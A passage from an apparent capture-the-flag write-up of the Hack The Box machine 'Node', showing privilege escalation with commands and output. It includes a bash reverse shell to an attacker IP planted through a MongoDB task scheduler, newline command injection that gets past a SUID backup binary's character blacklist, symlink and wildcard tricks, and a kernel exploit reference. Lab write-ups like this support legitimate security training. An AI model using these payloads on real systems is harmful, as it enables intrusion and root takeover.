console.log(&#39;Something went wrong: &#39; + error); } }); }, 30000); }); What it does? Scheduler app is connecting to the MongoDB database w/ mark’s credentials periodically, Retreiving values called cmd from the task collection, Executing cmd and Deleting the cmd value from task collection after executing it Since this application is started by tom, the command executed will be executed as tom allowing us to privilege escalate. To exploit this, we add a value into cmd from task collection, that will execute a reverse shell, allowing us privilege escalate to tom Exploiting scheduler Connect to MongoDB w/ mark credentials mark@node:/home/tom$ mongo -u mark -p 5AYRft73VtFpc84k scheduler MongoDB shell version: 3.2.16 connecting to: scheduler &amp;gt; show collections tasks Create reverse shell payload mark@node:/tmp$ printf &#39;#!/bin/bash\\n\\n /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.31/4444 0&amp;gt;&amp;amp;1\\n&#39; &amp;gt; exploit; chmod 4777 exploit; Add value into cmd from task collection that will execute our reverse shell payload we just created db.tasks.insert( {_id: 0, cmd: &quot;/tmp/exploit&quot;} ) WriteResult({ &quot;nInserted&quot; : 1 }) Shell obtained User Flag tom@node:~$ cat user.txt cat user.txt e1156acc3574e04b06908ecf76be91b1 tom@node:~$ Root - Via Command Injection Enumerate SUID files tom@node:~$ find / -perm -4000 2&amp;gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/local/bin/backup /usr/bin/chfn /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/sudo /usr/bin/pkexec /usr/bin/newgrp /usr/bin/passwd /usr/bin/newuidmap /usr/local/bin/backup View contents of /usr/local/bin/backup w/ strings tom@node:/tmp$ strings /usr/local/bin/backup ... ____________________________________________________ / \\ | _____________________________________________ | | | | | | | Secure Backup v1.0 | | | |_____________________________________________| | | | \\_____________________________________________________/ \\_______________________________________/ _______________________________________________ _-&#39; .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-. --- `-_ _-&#39;.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--. .-.-.`-_ _-&#39;.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_ _-&#39;.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_ _-&#39;.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_ :-----------------------------------------------------------------------------: `---._.-----------------------------------------------------------------._.---&#39; Could not open file Validated access token Ah-ah-ah! You didn&#39;t say the magic word! Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== /root /etc /tmp/.backup_%i /usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null /usr/bin/base64 -w0 %s ... There is a base64 encoded backup /usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null Directory we specified will be zipped with password magicword Earlier, app.js revealed Mark’s credentials, it also contains information about the binary backup -q &amp;lt;backup_key&amp;gt; &amp;lt;directory name to backup&amp;gt; Attempt to backup /etc/ tom@node:/tmp$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc/ [+] Finished! Encoded backup is below: UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA== Matches the base64 encoded text from above, meaning it is hardcoded into the binary Decode &amp;amp; unzip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# 7z e decoded.zip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# cat root.txt QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____. -~&quot;&quot;??9VWQQQQQQQQQQQQQQQQQQQ QQQQQQQQQQQQQP&#39;_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,&quot;?9$QQQQQQQQQQQQQQ QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ QQQQQQQQQQW&#39; jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ QQQQQQQP&#39;.yQQQQQQQQQQQP&quot; &amp;lt;wa,.!4WQQQQQQQWdWP??!&quot;??4WWQQQWQQc ?QWQQQQQ QQQQQP&#39;_a.&amp;lt;aamQQQW!&amp;lt;yF &quot;!` .. &quot;??$Qa &quot;WQQQWTVP&#39; &quot;??&#39; =QQmWWV?46/ ?QQQQQ QQQP&#39;sdyWQP?!`.-&quot;?46mQQQQQQT!mQQgaa. &amp;lt;wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ QQ[ j@mQP&#39;adQQP4ga, -????&quot; &amp;lt;jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?&quot;` -?QzQ7L ]QQQ QW jQkQ@ jWQQD&#39;-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc &quot;4QQQQa .QP4QQQQfWkl jQQQ QE ]QkQk $D?` waa &quot;?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`&quot;QQQD\\Qf(.QWQQ QQ,-Qm4Q/-QmQ6 &quot;WWQma/ &quot;??QQQQQQL 4W&quot;- -?$QQQQWP`s,awT$QQQ@ &quot;QW@?$:.yQQQQ QQm/-4wTQgQWQQ, ?4WWk 4waac -???$waQQQQQQQQF??&#39;&amp;lt;mWWWWWQW?^ ` ]6QQ&#39; yQQQQQ QQQQw,-?QmWQQQQw a, ?QWWQQQw _. &quot;????9VWaamQWV???&quot; a j/ ]QQf jQQQQQQ QQQQQQw,&quot;4QQQQQQm,-$Qa ???4F jQQQQQwc &amp;lt;aaas _aaaaa 4QW ]E )WQ`=QQQQQQQ QQQQQQWQ/ $QQQQQQQa ?H ]Wwa, ???9WWWh dQWWW,=QWWU? ?! )WQ ]QQQQQQQ QQQQQQQQQc-QWQQQQQW6, QWQWQQQk &amp;lt;c jWQ ]QQQQQQQ QQQQQQQQQQ,&quot;$WQQWQQQQg,.&quot;?QQQQ&#39;.mQQQmaa,., . .; QWQ.]QQQQQQQ QQQQQQQQQWQa ?$WQQWQQQQQa,.&quot;?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ QQQQQQQQQQWWma &quot;9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ QQQQQQQQQQQQQQQws &quot;Tqau?9maZ?WQmaas,, --~-- --- . _ssawmQQQQQQk 3QQQQWQ QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}&amp;lt;wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ QQQQQQQQQQQQQQQQQQQQQQWWQQga,-&quot;9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,. -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^&quot;!???????!^`_saQWWQQQQQQQ QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ Did the same for /root /etc/ /root Hard coded into displaying this troll face, we have to bypass it somehow. Use ltrace to intercept and record dynamic library calls by backup tom@node:/usr/local/bin$ ltrace backup -q &#39;&#39; /home/tom/user.txt __libc_start_main(0x80489fd, 4, 0xff9149f4, 0x80492c0 &amp;lt;unfinished ...&amp;gt; geteuid() = 1000 setuid(1000) = 0 strcmp(&quot;-q&quot;, &quot;-q&quot;) = 0 strncpy(0xff9148b8, &quot;&quot;, 100) = 0xff9148b8 strcpy(0xff9148a1, &quot;/&quot;) = 0xff9148a1 strcpy(0xff9148ad, &quot;/&quot;) = 0xff9148ad strcpy(0xff914837, &quot;/e&quot;) = 0xff914837 strcat(&quot;/e&quot;, &quot;tc&quot;) = &quot;/etc&quot; strcat(&quot;/etc&quot;, &quot;/m&quot;) = &quot;/etc/m&quot; strcat(&quot;/etc/m&quot;, &quot;yp&quot;) = &quot;/etc/myp&quot; strcat(&quot;/etc/myp&quot;, &quot;la&quot;) = &quot;/etc/mypla&quot; strcat(&quot;/etc/mypla&quot;, &quot;ce&quot;) = &quot;/etc/myplace&quot; strcat(&quot;/etc/myplace&quot;, &quot;/k&quot;) = &quot;/etc/myplace/k&quot; strcat(&quot;/etc/myplace/k&quot;, &quot;ey&quot;) = &quot;/etc/myplace/key&quot; strcat(&quot;/etc/myplace/key&quot;, &quot;s&quot;) = &quot;/etc/myplace/keys&quot; fopen(&quot;/etc/myplace/keys&quot;, &quot;r&quot;) = 0x8252008 fgets(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 1000, 0x8252008) = 0xff91444f strcspn(&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., &quot;\\n&quot;) = 64 strcmp(&quot;&quot;, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;...) = -1 fgets(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., 1000, 0x8252008) = 0xff91444f strcspn(&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;..., &quot;\\n&quot;) = 64 strcmp(&quot;&quot;, &quot;45fac180e9eee72f4fd2d9386ea7033e&quot;...) = -1 fgets(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., 1000, 0x8252008) = 0xff91444f strcspn(&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;..., &quot;\\n&quot;) = 64 strcmp(&quot;&quot;, &quot;3de811f4ab2b7543eaf45df611c2dd25&quot;...) = -1 fgets(&quot;\\n&quot;, 1000, 0x8252008) = 0xff91444f strcspn(&quot;\\n&quot;, &quot;\\n&quot;) = 0 strcmp(&quot;&quot;, &quot;&quot;) = 0 fgets(nil, 1000, 0x8252008) = 0 strstr(&quot;/home/tom/user.txt&quot;, &quot;..&quot;) = nil strstr(&quot;/home/tom/user.txt&quot;, &quot;/root&quot;) = nil strchr(&quot;/home/tom/user.txt&quot;, &#39;;&#39;) = nil strchr(&quot;/home/tom/user.txt&quot;, &#39;&amp;amp;&#39;) = nil strchr(&quot;/home/tom/user.txt&quot;, &#39;`&#39;) = nil strchr(&quot;/home/tom/user.txt&quot;, &#39;$&#39;) = nil strchr(&quot;/home/tom/user.txt&quot;, &#39;|&#39;) = nil strstr(&quot;/home/tom/user.txt&quot;, &quot;//&quot;) = nil strcmp(&quot;/home/tom/user.txt&quot;, &quot;/&quot;) = 1 strstr(&quot;/home/tom/user.txt&quot;, &quot;/etc&quot;) = nil strcpy(0xff91425b, &quot;/home/tom/user.txt&quot;) = 0xff91425b getpid() = 2328 time(0) = 1661598059 clock(0, 0, 0, 0) = 1564 srand(0x3ee45a2, 0x151bd39a, 0x3ee45a2, 0x804918c) = 0 rand(0, 0, 0, 0) = 0x6f4812d8 sprintf(&quot;/tmp/.backup_1866994392&quot;, &quot;/tmp/.backup_%i&quot;, 1866994392) = 23 sprintf(&quot;/usr/bin/zip -r -P magicword /tm&quot;..., &quot;/usr/bin/zip -r -P magicword %s &quot;..., &quot;/tmp/.backup_1866994392&quot;, &quot;/home/tom/user.txt&quot;) = 83 system(&quot;/usr/bin/zip -r -P magicword /tm&quot;... &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 0 access(&quot;/tmp/.backup_1866994392&quot;, 0) = 0 sprintf(&quot;/usr/bin/base64 -w0 /tmp/.backup&quot;..., &quot;/usr/bin/base64 -w0 %s&quot;, &quot;/tmp/.backup_1866994392&quot;) = 43 system(&quot;/usr/bin/base64 -w0 /tmp/.backup&quot;...UEsDBAoACQAAAIpQG1V42e7cLQAAACEAAAARABwAaG9tZS90b20vdXNlci50eHRVVAkAAxTeCWP69wljdXgLAAEEAAAAAAToAwAAYua/TKLRwymJYEfzktmCOCbIXj3FiHllGTBPArgJMmJavagIUq2NLg2eXV/+UEsHCHjZ7twtAAAAIQAAAFBLAQIeAwoACQAAAIpQG1V42e7cLQAAACEAAAARABgAAAAAAAEAAACggQAAAABob21lL3RvbS91c2VyLnR4dFVUBQADFN4JY3V4CwABBAAAAAAE6AMAAFBLBQYAAAAAAQABAFcAAACIAAAAAAA= &amp;lt;no return ...&amp;gt; --- SIGCHLD (Child exited) --- &amp;lt;... system resumed&amp;gt; ) = 0 remove(&quot;/tmp/.backup_1866994392&quot;) = 0 fclose(0x8252008) = 0 +++ exited (status 0) +++ system(&quot;/usr/bin/zip -r -P magicword /tm&quot;... &amp;lt;no return ...&amp;gt; system is called, command injection is possible &amp;lt;no return..&amp;gt; because the command is too long, earlier w/ strings we can see that the full command is: /usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null Filtered/Bad characters, displays troll face strstr(&quot;/home/tom/user.txt&quot;, &quot;..&quot;) strstr(&quot;/home/tom/user.txt&quot;, &quot;/root&quot;) strchr(&quot;/home/tom/user.txt&quot;, &#39;;&#39;) strchr(&quot;/home/tom/user.txt&quot;, &#39;&amp;amp;&#39;) strchr(&quot;/home/tom/user.txt&quot;, &#39;`&#39;) strchr(&quot;/home/tom/user.txt&quot;, &#39;$&#39;) strchr(&quot;/home/tom/user.txt&quot;, &#39;|&#39;) strstr(&quot;/home/tom/user.txt&quot;, &quot;//&quot;) strcmp(&quot;/home/tom/user.txt&quot;, &quot;/&quot;) strstr(&quot;/home/tom/user.txt&quot;, &quot;/etc&quot;) Command Injection How does the exploit work? Usually by chaining ;, |, &amp;amp;, we are able to do command injection, however it is blacklisted. Instead, we can use printf or &#39; to inject a newline (\\n) into the command, allowing us to do command injection. Also, all output is being redirected to /dev/null, we have to bypass it by adding another command at the end so that instead of our shell /bin/bash, the other command is redirected to /dev/null system will allow us to do a newline(\\n) to execute code Example payload: printf(\\n&amp;lt;command to execute&amp;gt;\\n&amp;lt;any commmand so that this command is redirected to /dev/null&amp;gt;) Do command injection w/ printf tom@node:~$ /usr/local/bin/backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; &quot;$(printf &#39;\\ntest\\n/bin/bash\\ntest&#39;)&quot; Do command injection w/ &#39; tom@node:/home/mark$ /usr/local/bin/backup -q &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39; &#39; -&amp;gt; test -&amp;gt; /bin/bash -&amp;gt; test&#39; zip error: Nothing to do! (/tmp/.backup_1407478153) To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;. See &quot;man sudo_root&quot; for details. Root Flag root@node:/home/mark# cat /root/root.txt c4e6a08a631d75e4953261b95db28af0 Privilege Escalation - 2Root - Via Symlink Symlink example tom@node:/tmp$ ln -s /home/tom/user.txt ./symlinkuser.txt tom@node:/tmp$ cat symlinkuser.txt e450cd47f4c0854621811c801bd2995e tom@node:/tmp$ cat /home/tom/user.txt e450cd47f4c0854621811c801bd2995e tom@node:/tmp$ Create symlink # I tried to create symlink at /tmp, it did not work, so i created another dir /tmp/symlink tom@node:/tmp$ mkdir symlink tom@node:/tmp$ cd symlink/ tom@node:/tmp/symlink$ ln -s /root/root.txt ./symlink tom@node:/tmp/symlink$ /usr/local/bin/backup a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /tmp/symlink/symlink UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAATABwAdG1wL3N5bWxpbmsvc3ltbGlua1VUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAABs1Wj5BdvdkagUcO85sE3hEWoJpzDthrbSYdG8ViWPAORPg8rChzckT0DL8LVQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAABMAGAAAAAAAAQAAAKCBAAAAAHRtcC9zeW1saW5rL3N5bWxpbmtVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBZAAAAigAAAAAA Decode &amp;amp; Unzip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# echo UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAATABwAdG1wL3N5bWxpbmsvc3ltbGlua1VUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAABs1Wj5BdvdkagUcO85sE3hEWoJpzDthrbSYdG8ViWPAORPg8rChzckT0DL8LVQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAABMAGAAAAAAAAQAAAKCBAAAAAHRtcC9zeW1saW5rL3N5bWxpbmtVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBZAAAAigAAAAAA | base64 -d &amp;gt; file.zip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# unzip file.zip Archive: file.zip [file.zip] tmp/symlink/symlink password: extracting: tmp/symlink/symlink ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# ls backup file.zip tmp ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# cd tmp/ ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot/tmp/symlink] └─# ls symlink ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot/tmp/symlink] └─# cat symlink d3f8db5b8f5376c577c3d1bec2f05749 Privilege Escalation - 3Root - Via Wildcard Wildcard example mark@node:/home$ ls -la /home/m* total 24 drwxr-xr-x 3 root root 4096 Sep 3 2017 . drwxr-xr-x 5 root root 4096 Aug 31 2017 .. -rw-r--r-- 1 root root 220 Aug 31 2017 .bash_logout -rw-r--r-- 1 root root 3771 Aug 31 2017 .bashrc drwx------ 2 root root 4096 Aug 31 2017 .cache -rw-r----- 1 root root 0 Sep 3 2017 .dbshell -rwxr-xr-x 1 root root 0 Sep 3 2017 .mongorc.js -rw-r--r-- 1 root root 655 Aug 31 2017 .profile mark@node:/home$ ls -la /home/m??? total 24 drwxr-xr-x 3 root root 4096 Sep 3 2017 . drwxr-xr-x 5 root root 4096 Aug 31 2017 .. -rw-r--r-- 1 root root 220 Aug 31 2017 .bash_logout -rw-r--r-- 1 root root 3771 Aug 31 2017 .bashrc drwx------ 2 root root 4096 Aug 31 2017 .cache -rw-r----- 1 root root 0 Sep 3 2017 .dbshell -rwxr-xr-x 1 root root 0 Sep 3 2017 .mongorc.js -rw-r--r-- 1 root root 655 Aug 31 2017 .profile Use wildcards *,? to backup /root tom@node:/tmp$ /usr/local/bin/backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; /r??t/r??t.txt UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAB9SNH9tpbCMRDf9y6k73Gjma9ED7t2sfalJ1nx76+RqMSHaxCWN2y0WgLKixRQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/tmp$ tom@node:/tmp$ /usr/local/bin/backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; /roo*/r*.txt UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAD4AUMzd3SN3m0NlZ8xs3cmDskgH0sKWl1rPYRyHW8s+GV0QKqR/mMHogdYuLlQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAAtom@node:/tmp$ Decode &amp;amp; Unzip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# echo UEsDBAoACQAAAIpQG1Wrkwe9LQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQADFN4JYxTeCWN1eAsAAQQAAAAABAAAAAD4AUMzd3SN3m0NlZ8xs3cmDskgH0sKWl1rPYRyHW8s+GV0QKqR/mMHogdYuLlQSwcIq5MHvS0AAAAhAAAAUEsBAh4DCgAJAAAAilAbVauTB70tAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAAxTeCWN1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA | base64 -d &amp;gt; root.zip ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# unzip root.zip Archive: root.zip [root.zip] root/root.txt password: extracting: root/root.txt ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# cat ./root/root.txt d3f8db5b8f5376c577c3d1bec2f05749 Privilege Escalation - 4Root - Via HOME ENV View HOME env tom@node:/tmp$ env | grep HOME HOME=/home/tom ~ = /home/tom We have to change our HOME ENV to /root so that we can backup ~, inturn backing up /root Change our HOME ENV and backup tom@node:/tmp$ export HOME=/root tom@node:/tmp$ /usr/local/bin/backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; &quot;~&quot; Decode and UnzipPrivilege Escalation - 5Root - Via root instead of /root /root is not filtered, proceed to / and backup root tom@node:~$ cd / tom@node:/$ backup -q &#39;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#39; root Decode and UnzipPrivilege Escalation - 6Root - Via Kernel Exploit Check Linux version tom@node:/tmp$ uname -a Linux node 4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux Linux node 4.4.0-93-generic Search for exploits, google linux 4.40-93 exploit 44298.c Compile &amp;amp; Exploit tom@node:/tmp$ gcc 44298.c -o exploit; ./exploit Privilege Escalation - 7 (BOF)Root - Via BOF ret2libc Ippsec Guide Idenitify security properties built into backup ┌──(root💀kali)-[~/htb/node/10.10.10.58/loot] └─# checksec backup [*] &#39;/root/htb/node/10.10.10.58/loot/backup&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) tom@node:/tmp$ cat /proc/sys/kernel/randomize_va_space 2 NX - Enabled ASLR - Enabled Use ltrace to intercept and record dynamic library calls by 